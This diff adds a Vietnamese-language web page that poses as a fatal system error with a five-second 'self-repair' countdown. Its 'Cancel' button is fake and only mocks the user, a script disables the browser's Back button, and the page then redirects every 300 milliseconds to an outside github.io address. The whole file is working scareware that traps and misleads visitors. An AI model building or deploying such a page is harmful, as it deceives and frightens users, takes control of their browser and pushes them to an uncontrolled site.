@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Lỗi hệ thống</title>
+  <style>
+    body {
+      margin: 0;
+      background: #0d1117;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .box {
+      background: #161b22;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    }
+    button {
+      padding: 10px 20px;
+      border: none;
+      background: red;
+      color: white;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h1>⚠ Lỗi nghiêm trọng</h1>
+  <p>Hệ thống sẽ tự sửa trong <span id="count">5</span> giây...</p>
+  <button onclick="fakeClick()">Hủy</button>
+</div>
+
+<script>
+  const target = "https://phamtranceven-lang.github.io/ALO";
+
+  // đếm ngược
+  let time = 5;
+  const countEl = document.getElementById("count");
+
+  const countdown = setInterval(() => {
+    time--;
+    countEl.innerText = time;
+
+    if (time <= 0) {
+      clearInterval(countdown);
+      startRedirectLoop();
+    }
+  }, 1000);
+
+  // nút giả
+  function fakeClick() {
+    alert("Không thể hủy 😈");
+  }
+
+  // chống back
+  history.pushState(null, null, location.href);
+  window.onpopstate = function () {
+    history.go(1);
+  };
+
+  // redirect liên tục
+  function startRedirectLoop() {
+    setInterval(() => {
+      window.location.href = target;
+    }, 300);
+  }
+</script>
+
+</body>
+</html>
